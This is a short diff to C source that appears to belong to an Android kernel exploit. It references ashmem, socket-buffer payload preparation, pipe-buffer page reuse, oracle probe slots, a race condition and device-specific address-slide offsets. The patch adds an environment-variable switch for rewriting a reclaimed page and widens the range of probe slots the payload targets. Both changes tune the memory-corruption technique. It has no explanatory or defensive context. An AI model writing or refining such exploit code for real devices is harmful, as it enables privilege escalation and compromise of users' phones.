@@ -333,6 +333,20 @@ int data_addr_canonical;
 int app_fops_reused_page_ready;
 char ashmem_path[256] = "/dev/ashmem";
 
+int app_fops_page_reuse_enabled(void) {
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  const char *value = getenv("RMG_P0_PAGE_REUSE");
+  if (value && *value) {
+    return strcmp(value, "0") != 0;
+  }
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE_DEFAULT)
+  return APP_FOPS_REWRITE_RECLAIMED_PAGE_DEFAULT != 0;
+#endif
+#endif
+  return 0;
+}
+
 __attribute__((weak)) void app_publish_writer_started(void) {
 }
 
@@ -1734,7 +1748,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
-        } else if (slot == P0_ORACLE_PROBE_SLOT) {
+        } else if (slot >= P0_ORACLE_PROBE_SLOT &&
+                   slot < P0_ORACLE_PROBE_SLOT +
+                              P0_ORACLE_PROBE_SLOT_COUNT) {
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
     defined(SLIDE_S928_PROBE_PARENT_OFF) && \
     defined(SLIDE_S928_PROBE_TARGET_IMAGE_OFF)
